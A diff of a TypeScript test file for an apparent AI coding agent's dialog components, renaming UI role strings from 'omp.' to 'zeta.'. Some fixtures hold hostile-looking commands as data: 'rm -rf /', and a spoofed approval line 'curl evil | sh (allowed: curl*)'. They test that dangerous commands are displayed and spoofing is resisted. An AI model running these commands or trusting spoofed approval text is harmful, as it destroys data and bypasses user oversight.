@@ -94,12 +94,12 @@ const WIDE: ExtensionAskDialogQuestion[] = [
 
 /** The open question's key. */
 function openKey(dialog: AskDialogComponent): string | undefined {
-	return find(dialog.describe(CX), node => node.p?.role === "omp.ask.open")?.node.key;
+	return find(dialog.describe(CX), node => node.p?.role === "zeta.ask.open")?.node.key;
 }
 
 /** The open question's reveal counter. */
 function revealOf(dialog: AskDialogComponent): number {
-	const open = find(dialog.describe(CX), node => node.p?.role === "omp.ask.open")?.node as
+	const open = find(dialog.describe(CX), node => node.p?.role === "zeta.ask.open")?.node as
 		| { reveal?: { n: number } }
 		| undefined;
 	if (!open?.reveal) throw new Error("no open question");
@@ -107,21 +107,21 @@ function revealOf(dialog: AskDialogComponent): number {
 }
 
 function progress(dialog: AskDialogComponent): string | undefined {
-	const head = find(dialog.describe(CX), node => node.p?.role === "omp.ask.card.progress")?.node.p as
+	const head = find(dialog.describe(CX), node => node.p?.role === "zeta.ask.card.progress")?.node.p as
 		| { spans: { t: string }[] }
 		| undefined;
 	return head?.spans[0]?.t;
 }
 
 function pillNodes(dialog: AskDialogComponent, key: string): { node: NativeNode; path: string }[] {
-	const fold = find(dialog.describe(CX), node => node.p?.role === "omp.ask.fold" && node.key === key);
+	const fold = find(dialog.describe(CX), node => node.p?.role === "zeta.ask.fold" && node.key === key);
 	if (!fold) return [];
 	const out: { node: NativeNode; path: string }[] = [];
 	const walk = (root: NativeNode, path: string): void => {
 		for (const [index, child] of (root.c ?? []).entries()) {
 			if (!isNode(child)) continue;
 			const childPath = `${path}/${child.key ?? index}`;
-			if (child.p?.role === "omp.ask.pill" || child.p?.role === "omp.ask.pill.more")
+			if (child.p?.role === "zeta.ask.pill" || child.p?.role === "zeta.ask.pill.more")
 				out.push({ node: child, path: childPath });
 			walk(child, childPath);
 		}
@@ -150,7 +150,7 @@ function clickPill(dialog: AskDialogComponent, key: string, label: string): void
 }
 
 function press(dialog: AskDialogComponent, act: string): void {
-	const button = find(dialog.describe(CX), node => node.p?.role === "omp.btn" && node.key === act);
+	const button = find(dialog.describe(CX), node => node.p?.role === "zeta.btn" && node.key === act);
 	if (!button) throw new Error(`no ${act} button`);
 	dialog.handleNativeEvent({ type: "action", key: button.path, act, mods: [] });
 }
@@ -177,16 +177,16 @@ describe("dialogs under a native surface", () => {
 			onPrompt: async () => undefined,
 		});
 		const root = dialog.describe(CX);
-		expect(root.p?.role).toBe("omp.ask.card");
+		expect(root.p?.role).toBe("zeta.ask.card");
 		expect(progress(dialog)).toBe("0 of 3 answered");
 		expect(openKey(dialog)).toBe("q0");
-		expect(find(root, node => node.p?.role === "omp.ask.options")?.node.key).toBe("q0");
+		expect(find(root, node => node.p?.role === "zeta.ask.options")?.node.key).toBe("q0");
 		// Four pills, labels cut at 20 cells, then `+N`.
 		expect(pills(dialog, "q1")).toEqual(["us-east-1", "us-west-2", "eu-west-1", "a very long region…", "+2"]);
 		expect(pills(dialog, "q2")).toEqual(["lint", "test"]);
 		// No tabs, Review, Next or Hide natively.
 		expect(find(root, node => node.k === "tabs")).toBeUndefined();
-		const buttons = all(root, node => node.p?.role === "omp.btn").map(button => button.key);
+		const buttons = all(root, node => node.p?.role === "zeta.btn").map(button => button.key);
 		expect(buttons).toEqual(["note", "cancel", "submit"]);
 	});
 
@@ -208,7 +208,7 @@ describe("dialogs under a native surface", () => {
 		clickPill(dialog, "q2", "✓ test");
 		expect(pills(dialog, "q2")).toEqual(["lint", "test"]);
 		// A click on the fold opens it.
-		const fold = find(dialog.describe(CX), node => node.p?.role === "omp.ask.fold" && node.key === "q1")!;
+		const fold = find(dialog.describe(CX), node => node.p?.role === "zeta.ask.fold" && node.key === "q1")!;
 		dialog.handleNativeEvent({ type: "action", key: fold.path, act: "open:1", mods: [] });
 		expect(openKey(dialog)).toBe("q1");
 		expect(revealOf(dialog)).toBe(reveal + 1);
@@ -218,7 +218,7 @@ describe("dialogs under a native surface", () => {
 		const dialog = ask();
 		const selected = () =>
 			(
-				find(dialog.describe(CX), node => node.p?.role === "omp.ask.options")?.node.p as
+				find(dialog.describe(CX), node => node.p?.role === "zeta.ask.options")?.node.p as
 					| { selected?: string }
 					| undefined
 			)?.selected;
@@ -284,15 +284,15 @@ describe("dialogs under a native surface", () => {
 		const onPrompt = vi.fn(async () => "my own words");
 		const onSubmit = vi.fn();
 		const dialog = new AskDialogComponent(QUESTIONS, { onSubmit, onCancel: vi.fn(), onPrompt });
-		const options = find(dialog.describe(CX), node => node.p?.role === "omp.ask.options");
+		const options = find(dialog.describe(CX), node => node.p?.role === "zeta.ask.options");
 		dialog.handleNativeEvent({ type: "activate", key: options!.path, item: "other" });
 		// The dialog awaits this same promise first, so its answer handling has run once it settles.
 		await onPrompt.mock.results[0]?.value;
 		expect(openKey(dialog)).toBe("q1");
-		const answer = find(dialog.describe(CX), node => node.p?.role === "omp.ask.fold.answer")?.node;
+		const answer = find(dialog.describe(CX), node => node.p?.role === "zeta.ask.fold.answer")?.node;
 		const spans = answer?.k === "text" ? answer.p?.spans : undefined;
 		expect(spans?.map(part => part.t).join("")).toBe("Other: “my own words”");
-		const next = find(dialog.describe(CX), node => node.p?.role === "omp.ask.options");
+		const next = find(dialog.describe(CX), node => node.p?.role === "zeta.ask.options");
 		expect(next?.node.key).toBe("q1");
 		dialog.handleNativeEvent({ type: "activate", key: next!.path, item: "option:1" });
 		expect(onSubmit.mock.calls[0]?.[0].results.map((r: { customInput?: string }) => r.customInput)).toEqual([
@@ -316,7 +316,7 @@ describe("dialogs under a native surface", () => {
 		try {
 			expect(harness.errors).toEqual([]);
 			expect(harness.region("layer")?.c ?? []).toEqual([]);
-			const card = harness.find(node => node.p?.role === "omp.ask.card");
+			const card = harness.find(node => node.p?.role === "zeta.ask.card");
 			expect(card).toBeDefined();
 			expect(JSON.stringify(harness.region("main"))).toContain(card!.id);
 			expect(harness.findAll(node => node.k === "overlay")).toEqual([]);
@@ -375,10 +375,10 @@ describe("dialogs under a native surface", () => {
 			{ skipNotice: () => notice },
 		);
 		const skip = () =>
-			find(dialog.describe(CX), node => node.p?.role === "omp.ask.skip")?.node.p as
+			find(dialog.describe(CX), node => node.p?.role === "zeta.ask.skip")?.node.p as
 				| { spans: { t: string }[] }
 				| undefined;
-		const body = () => find(dialog.describe(CX), node => node.p?.role === "omp.ask.card.body")?.node.p;
+		const body = () => find(dialog.describe(CX), node => node.p?.role === "zeta.ask.card.body")?.node.p;
 		expect(skip()?.spans[0]?.t).toBe("⚠ Sending your draft skips this question");
 		expect(body()?.mark).toBe("drop");
 		notice = undefined;
@@ -447,7 +447,7 @@ describe("dialogs under a native surface", () => {
 			expect(denied.onDeny).toHaveBeenCalledTimes(1);
 			const pointed = { onApprove: vi.fn(), onDeny: vi.fn() };
 			const clicked = new ApprovalDialogComponent(prompt, pointed);
-			const approve = find(clicked.describe(), node => node.p?.role === "omp.btn" && node.key === "approve");
+			const approve = find(clicked.describe(), node => node.p?.role === "zeta.btn" && node.key === "approve");
 			clicked.handleNativeEvent({ type: "action", key: approve!.path, act: "approve", mods: [] });
 			expect(pointed.onApprove).toHaveBeenCalledTimes(1);
 		} finally {
@@ -467,7 +467,7 @@ describe("dialogs under a native surface", () => {
 				stripVTControlCharacters(dialog.render(80).join("\n"))
 					.split("\n")
 					.filter(line => /Approve|Deny/.test(line));
-			const choices = () => find(dialog.describe(), node => node.p?.role === "omp.approval.choices")!;
+			const choices = () => find(dialog.describe(), node => node.p?.role === "zeta.approval.choices")!;
 			const selected = () => {
 				const props = choices().node.p;
 				return props && "selected" in props ? props.selected : undefined;
@@ -487,7 +487,7 @@ describe("dialogs under a native surface", () => {
 
 			const clicked = { onApprove: vi.fn(), onDeny: vi.fn() };
 			const pointed = new ApprovalDialogComponent("Allow tool: bash\nCommand: ls", clicked);
-			const list = find(pointed.describe(), node => node.p?.role === "omp.approval.choices")!;
+			const list = find(pointed.describe(), node => node.p?.role === "zeta.approval.choices")!;
 			pointed.handleNativeEvent({ type: "select", key: list.path, item: "deny" });
 			expect(clicked.onDeny).toHaveBeenCalledTimes(1);
 		} finally {
@@ -528,7 +528,7 @@ describe("dialogs under a native surface", () => {
 				grants: [folder, file],
 				onGrant: clicked,
 			});
-			const list = find(pointed.describe(), node => node.p?.role === "omp.approval.choices")!;
+			const list = find(pointed.describe(), node => node.p?.role === "zeta.approval.choices")!;
 			pointed.handleNativeEvent({ type: "select", key: list.path, item: "grant0" });
 			expect(clicked).toHaveBeenCalledWith(folder, false);
 		} finally {
@@ -552,7 +552,7 @@ describe("dialogs under a native surface", () => {
 		expect(highlighted()).toContain("Approve");
 		dialog.handleInput("k");
 		expect(highlighted()).toContain("Deny and send message");
-		const choices = find(dialog.describe(), node => node.p?.role === "omp.approval.choices")!;
+		const choices = find(dialog.describe(), node => node.p?.role === "zeta.approval.choices")!;
 		expect(choices.node.p && "selected" in choices.node.p ? choices.node.p.selected : undefined).toBe("deny");
 		draft = "";
 		expect(highlighted()).toContain("Approve");
@@ -636,7 +636,7 @@ describe("dialogs under a native surface", () => {
 			vi.advanceTimersByTime(900);
 			expect(dialog.toggleDetails()).toBe(true);
 			vi.advanceTimersByTime(900);
-			const expand = find(dialog.describe(), node => node.p?.role === "omp.btn" && node.key === "expand");
+			const expand = find(dialog.describe(), node => node.p?.role === "zeta.btn" && node.key === "expand");
 			dialog.handleNativeEvent({ type: "action", key: expand!.path, act: "expand", mods: [] });
 			vi.advanceTimersByTime(900);
 			expect(onTimeoutReset).toHaveBeenCalledTimes(2);
@@ -658,9 +658,9 @@ describe("dialogs under a native surface", () => {
 		const scroller = () => {
 			const list = find(
 				dialog.describe(),
-				node => node.k === "list" && find(node, child => child.p?.role === "omp.approval.details") !== undefined,
+				node => node.k === "list" && find(node, child => child.p?.role === "zeta.approval.details") !== undefined,
 			)!;
-			const details = find(list.node, node => node.p?.role === "omp.approval.details")!.node;
+			const details = find(list.node, node => node.p?.role === "zeta.approval.details")!.node;
 			return { max: list.node.k === "list" ? list.node.p?.max : undefined, scroll: details.scroll };
 		};
 		const cap = { lines: PREVIEW_LIMITS.COLLAPSED_ITEMS };
@@ -705,9 +705,9 @@ describe("dialogs under a native surface", () => {
 		expect(routed).toEqual([]);
 		expect(body()).toContain("rm-rf~");
 		expect(body()).toContain("secondline");
-		const row = find(dialog.describe(), node => node.p?.role === "omp.approval.details")?.node.c?.[0];
+		const row = find(dialog.describe(), node => node.p?.role === "zeta.approval.details")?.node.c?.[0];
 		expect((row as NativeNode).p).not.toHaveProperty("truncate");
-		const expand = find(dialog.describe(), node => node.p?.role === "omp.btn" && node.key === "expand");
+		const expand = find(dialog.describe(), node => node.p?.role === "zeta.btn" && node.key === "expand");
 		dialog.handleNativeEvent({ type: "action", key: expand!.path, act: "expand", mods: [] });
 		expect(body()).not.toContain("rm-rf~");
 		// Without a full prompt there is nothing to expand, so no Details button.
@@ -740,7 +740,7 @@ describe("dialogs under a native surface", () => {
 			promptedLine.replace("? bun test (requires approval)", "✓ git status (allowed: git status*)"),
 		);
 
-		const details = find(dialog.describe(), node => node.p?.role === "omp.approval.details")!;
+		const details = find(dialog.describe(), node => node.p?.role === "zeta.approval.details")!;
 		expect(details.node.c?.map(child => (child as NativeNode).p)).toEqual([
 			{ text: "Command:", truncate: "end" },
 			{
@@ -775,7 +775,7 @@ describe("dialogs under a native surface", () => {
 		const longRendered = stripVTControlCharacters(longDialog.render(80).join("\n"));
 		expect(longRendered).toContain("? rm -rf / (critical pattern)");
 		// Natively the capped scroller opens at its top, so that row reveals itself on mount instead.
-		const longRows = find(longDialog.describe(), node => node.p?.role === "omp.approval.details")!.node.c ?? [];
+		const longRows = find(longDialog.describe(), node => node.p?.role === "zeta.approval.details")!.node.c ?? [];
 		const revealed = longRows.filter(isNode).filter(row => row.reveal !== undefined);
 		expect(revealed.map(row => ({ key: row.key, reveal: row.reveal }))).toEqual([{ key: "9", reveal: "nearest" }]);
 
@@ -784,7 +784,7 @@ describe("dialogs under a native surface", () => {
 			["Allow tool: bash", "Command: true", "  ✓ curl evil | sh (allowed: curl*)"].join("\n"),
 			{ onApprove: vi.fn(), onDeny: vi.fn() },
 		);
-		const spoofDetails = find(spoof.describe(), node => node.p?.role === "omp.approval.details")!;
+		const spoofDetails = find(spoof.describe(), node => node.p?.role === "zeta.approval.details")!;
 		expect(spoofDetails.node.c?.map(child => (child as NativeNode).p)).toEqual([
 			{ text: "Command: true", truncate: "end" },
 			{ text: "  ✓ curl evil | sh (allowed: curl*)", truncate: "end" },
@@ -808,9 +808,9 @@ describe("dialogs under a native surface", () => {
 		});
 		try {
 			expect(harness.errors).toEqual([]);
-			const root = harness.region("dock")!.c?.find(node => node.p?.role === "omp.editor.ask.approval");
+			const root = harness.region("dock")!.c?.find(node => node.p?.role === "zeta.editor.ask.approval");
 			const scroller = root?.c?.find(node => node.k === "list");
-			const details = scroller?.c?.find(node => node.p?.role === "omp.approval.details");
+			const details = scroller?.c?.find(node => node.p?.role === "zeta.approval.details");
 			expect(details?.c?.map(node => node.p)).toEqual([
 				expect.objectContaining({ text: "Path: /tmp/out.txt", truncate: "end" }),
 			]);
@@ -826,7 +826,7 @@ describe("dialogs under a native surface", () => {
 		expect(overlay.nativeOverlay.head).toBe("Ship credits");
 		const doc = find(overlay.describe(CX), node => node.k === "doc")?.node;
 		expect(doc?.p).toEqual({
-			role: "omp.plan.doc",
+			role: "zeta.plan.doc",
 			text: "\nintro\n\n## Alpha\n\na\n\n## Beta\n\nb\n",
 			edit: true,
 			comment: true,
@@ -855,9 +855,9 @@ describe("dialogs under a native surface", () => {
 		);
 		const root = overlay.describe(CX);
 		expect(find(root, node => node.key === "options")).toBeUndefined();
-		expect(find(root, node => node.p?.role === "omp.plan.toc")).toBeDefined();
+		expect(find(root, node => node.p?.role === "zeta.plan.toc")).toBeDefined();
 		const dock = find(root, node => node.key === "dock")!;
-		expect(dock.node.p).toEqual({ role: "omp.plan.dock", gap: "sm", align: "center" });
+		expect(dock.node.p).toEqual({ role: "zeta.plan.dock", gap: "sm", align: "center" });
 		expect(dock.node.c?.filter(isNode).map(child => child.key ?? child.k)).toEqual([
 			"approve",
 			"model",
@@ -866,7 +866,7 @@ describe("dialogs under a native surface", () => {
 			"cancel",
 		]);
 		const approve = find(dock.node, node => node.key === "approve")!.node;
-		expect(approve.p).toEqual({ variant: "split", role: "omp.plan.approve" });
+		expect(approve.p).toEqual({ variant: "split", role: "zeta.plan.approve" });
 		expect(approve.c?.filter(isNode).map(child => ({ k: child.k, p: child.p }))).toEqual([
 			{ k: "button", p: { text: "Approve", variant: "primary", keys: ["enter"], actions: { click: "approve" } } },
 			{
@@ -890,7 +890,7 @@ describe("dialogs under a native surface", () => {
 			},
 		]);
 		expect(find(dock.node, node => node.key === "model")?.node.p).toMatchObject({
-			role: "omp.plan.model",
+			role: "zeta.plan.model",
 			text: "Sonnet",
 			caret: true,
 			items: [
@@ -956,7 +956,7 @@ describe("dialogs under a native surface", () => {
 		expect(find(root, node => node.k === "doc")?.node.p).toMatchObject({
 			comments: [{ id: "c1", quote: "second", at, note: "too vague" }],
 		});
-		expect(find(root, node => node.p?.role === "omp.plan.toc")).toBeUndefined();
+		expect(find(root, node => node.p?.role === "zeta.plan.toc")).toBeUndefined();
 		expect(find(root, node => node.key === "main")?.node.p).toMatchObject({
 			text: "Refine",
 			actions: { click: "refine" },
@@ -1069,7 +1069,7 @@ describe("dialogs under a native surface", () => {
 		dialog.showAuth("https://auth.example.com/authorize?x=1", "Enter code: ABCD-1234");
 		const waiting = dialog.describe();
 		// The device code copies itself; with nothing to answer, opening the page is the primary action.
-		expect(find(waiting, node => node.p?.role === "omp.login.code")?.node.p).toMatchObject({
+		expect(find(waiting, node => node.p?.role === "zeta.login.code")?.node.p).toMatchObject({
 			actions: { click: "copy" },
 			href: "ABCD-1234",
 		});
